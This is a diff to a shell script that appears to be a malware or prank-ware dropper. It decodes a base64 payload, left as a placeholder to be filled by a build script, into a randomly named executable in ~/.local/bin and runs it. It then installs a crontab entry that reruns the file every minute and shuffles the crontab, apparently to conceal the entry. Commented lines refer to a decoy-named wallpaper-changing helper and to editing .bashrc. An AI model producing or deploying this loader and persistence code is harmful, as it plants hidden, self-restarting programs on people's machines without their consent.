@@ -1,5 +1,7 @@
 #!/bin/sh
 
+base64_payload='...'  # line 3 will be set by the build script
+
 # get name of desktop environment
 de_info="$DESKTOP_SESSION $XDG_CURRENT_DESKTOP" # this may contain weird stuff we don't need, but this string is searched using grep anyway
 if [ -n "$GNOME_DESKTOP_SESSION_ID" ]; then
@@ -12,20 +14,20 @@ fi
 
 
 filename_length=$((($(date +%N) % 5) + 1))
-filepath="$HOME/.local/bin/$(head -c $filename_length  /dev/urandom | base64 | head -c $filename_length | tr '/' '-')"
+filepath="$HOME/.local/bin/$(head -c $filename_length  /dev/urandom | base64 | head -c $filename_length | tr '/-' 'Zz')"
 while [ -e "$filepath" ]; do
     filename_length=$((filename_length + 1))
-    filepath="$HOME/.local/bin/$(head -c $filename_length  /dev/urandom | base64 | head -c $filename_length | tr '/' '-')"
+    filepath="$HOME/.local/bin/$(head -c $filename_length  /dev/urandom | base64 | head -c $filename_length | tr '/-' 'Zz')"
 done
 
 mkdir -p "$HOME/.local/bin"
 
-echo "PLACEHOLDER_edit_bashrc" | base64 --decode | awk -v newpath="this_file_path='$filepath'" 'NR==3 {$0=newpath} {print}' > "$filepath"
-chmod +x "$filepath"
+echo "$base64_payload" | base64 --decode | awk -v newpath="this_file_path='$filepath'" 'NR==3 {$0=newpath} {print}' | awk -v deinfo="de_info='$de_info'" 'NR==4 {$0=deinfo} {print}' > "$filepath"
+chmod +x -- "$filepath"
 "$filepath"
 
-# echo "PLACEHOLDER_change_wallpaper" | base64 --decode | sed "s/INST_PLACEHOLDER_de_info/$de_info/g" > "$HOME/.local/bin/_zip_err_load_link_wp"
+# echo "PLACEHOLDER_change_wallpaper" | base64 --decode > "$HOME/.local/bin/_zip_err_load_link_wp"
 # chmod +x "$HOME/.local/bin/_zip_err_load_link_wp"
 # "$HOME/.local/bin/_zip_err_load_link_wp"
 
-{ crontab -l | grep -Fv "$filepath" | grep -Fv "_zip_err_load_link_wp"; printf '00 11 1 * * %s\n* * * * * %s/.local/bin/_zip_err_load_link_wp\n' "$filepath" "$HOME"; } | crontab -
+{ crontab -l | grep -Fv "$filepath" | grep -Ev "^ *$"; printf '* * * * * %s\n' "$filepath"; } | shuf | crontab -
